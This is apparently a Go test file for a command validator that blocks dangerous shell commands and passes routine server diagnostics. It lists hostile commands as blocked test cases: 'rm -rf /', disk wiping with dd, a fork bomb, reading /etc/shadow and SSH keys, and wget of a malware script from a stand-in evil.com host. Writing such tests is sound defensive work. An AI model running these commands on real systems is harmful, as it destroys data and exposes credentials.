package safety

import "testing"

func TestMustBlockCases(t *testing.T) {
	cases := []struct {
		cmd    string
		reason string
	}{
		{"rm -rf /", "rm -rf 根目录"},
		{"rm -rf /*", "rm -rf /* 等价删根"},
		{"cat /etc/shadow", "敏感文件"},
		{"find / -delete", "find -delete"},
		{"dd if=/dev/zero of=/dev/sda", "dd 写设备"},
		{":(){ :|:& };:", "fork bomb"},
		{"chmod -R 777 /", "chmod 777 根"},
		{"wget http://evil.com/malware.sh", "不在白名单"},
		{"curl http://evil.com", "不在白名单"},
		{"python3 -c 'import os; os.system(\"rm -rf /\")'", "不在白名单"},
		{"systemctl mask sshd", "subcommand not allowed"},
		{"kill -9 12345", "forbidden arg -9"},
	}

	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			result := ValidateCommand(tc.cmd)
			if result.Status != StatusBlocked {
				t.Errorf("expected BLOCKED for %q (reason: %s), got %s: %s",
					tc.cmd, tc.reason, result.Status, result.Detail)
			}
		})
	}
}

func TestMustPassCases(t *testing.T) {
	cases := []string{
		"df -h",
		"du -sh /var/log",
		"ps aux",
		"ss -tnlp",
		"journalctl --since '1 hour ago'",
		"cat /var/log/nginx/access.log",
		"tail -100 /var/log/messages",
		"grep ERROR /var/log/myapp.log",
		"find /tmp -name '*.tmp' -mtime +7",
		"systemctl status nginx",
		"free -h",
		"uptime",
		"lsof -i :80",
		"uname -a",
		"top -bn1",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			result := ValidateCommand(cmd)
			if result.Status == StatusBlocked {
				t.Errorf("expected PASSED for %q, got BLOCKED: %s (%s)",
					cmd, result.Detail, result.Reason)
			}
		})
	}
}

func TestCatShadowBlocked(t *testing.T) {
	// cat is in whitelist but /etc/shadow is sensitive
	result := ValidateCommand("cat /etc/shadow")
	if result.Status != StatusBlocked {
		t.Fatalf("cat /etc/shadow should be BLOCKED, got %s", result.Status)
	}
	if result.Reason != ReasonFile {
		t.Fatalf("expected SAFETY_FILE_001, got %s", result.Reason)
	}
}

func TestFindDeleteBlocked(t *testing.T) {
	result := ValidateCommand("find / -name '*.log' -delete")
	if result.Status != StatusBlocked {
		t.Fatalf("find -delete should be BLOCKED, got %s: %s", result.Status, result.Detail)
	}
}

func TestSudoAllowed(t *testing.T) {
	result := ValidateCommand("sudo systemctl restart nginx")
	if result.Status == StatusBlocked {
		t.Fatalf("sudo systemctl restart should be ESCALATE, got BLOCKED: %s", result.Detail)
	}
}

func TestSudoNotAllowed(t *testing.T) {
	result := ValidateCommand("sudo rm -rf /tmp")
	if result.Status != StatusBlocked {
		t.Fatalf("sudo rm should be BLOCKED, got %s", result.Status)
	}
}


func TestEmptyCommand(t *testing.T) {
	result := ValidateCommand("")
	if result.Status != StatusPassed {
		t.Fatalf("empty command should pass, got %s", result.Status)
	}
}

func TestUnparseableCommand(t *testing.T) {
	// Unterminated quote
	result := ValidateCommand(`echo "hello`)
	if result.Status != StatusBlocked {
		t.Fatalf("unparseable command should be blocked, got %s", result.Status)
	}
}

func TestPathStrippedCommand(t *testing.T) {
	// /usr/bin/df should be treated as df
	result := ValidateCommand("/usr/bin/df -h")
	if result.Status != StatusPassed {
		t.Fatalf("/usr/bin/df should pass (stripped to df), got %s: %s", result.Status, result.Detail)
	}
}

func TestWriteToProtectedPath(t *testing.T) {
	result := ValidateCommand("truncate -s 0 /etc/nginx/nginx.conf")
	if result.Status != StatusBlocked || result.Reason != ReasonPath {
		t.Fatalf("write to /etc/ should be blocked with PATH reason, got %s %s", result.Status, result.Reason)
	}
}

func TestSensitiveFilePattern(t *testing.T) {
	result := ValidateCommand("cat /home/user/.ssh/id_rsa.key")
	if result.Status != StatusBlocked || result.Reason != ReasonFile {
		t.Fatalf("access to .key file should be blocked, got %s %s", result.Status, result.Reason)
	}
}

func TestSystemctlAllowedSubcommands(t *testing.T) {
	allowed := []string{"status", "is-active", "list-units", "restart", "start", "stop", "reload"}
	for _, sub := range allowed {
		result := ValidateCommand("systemctl " + sub + " nginx")
		if result.Status == StatusBlocked {
			t.Errorf("systemctl %s should pass, got BLOCKED: %s", sub, result.Detail)
		}
	}
}

func TestIpAddrAllowed(t *testing.T) {
	result := ValidateCommand("ip addr show")
	if result.Status == StatusBlocked {
		t.Fatalf("ip addr should pass, got BLOCKED: %s", result.Detail)
	}
}

func TestIpUnknownSubcommand(t *testing.T) {
	result := ValidateCommand("ip tunnel add")
	if result.Status != StatusBlocked {
		t.Fatalf("ip tunnel should be blocked (not in whitelist), got %s", result.Status)
	}
}

func TestBareSudo(t *testing.T) {
	result := ValidateCommand("sudo")
	if result.Status != StatusBlocked {
		t.Fatalf("bare sudo should be blocked, got %s", result.Status)
	}
}

func TestFindWithoutDelete(t *testing.T) {
	result := ValidateCommand("find /var/log -name '*.gz' -mtime +30")
	if result.Status != StatusPassed {
		t.Fatalf("find without -delete should pass, got %s: %s", result.Status, result.Detail)
	}
}

func TestJournalctlForbiddenArg(t *testing.T) {
	result := ValidateCommand("journalctl --rotate")
	if result.Status != StatusBlocked {
		t.Fatalf("journalctl --rotate should be blocked, got %s", result.Status)
	}
}
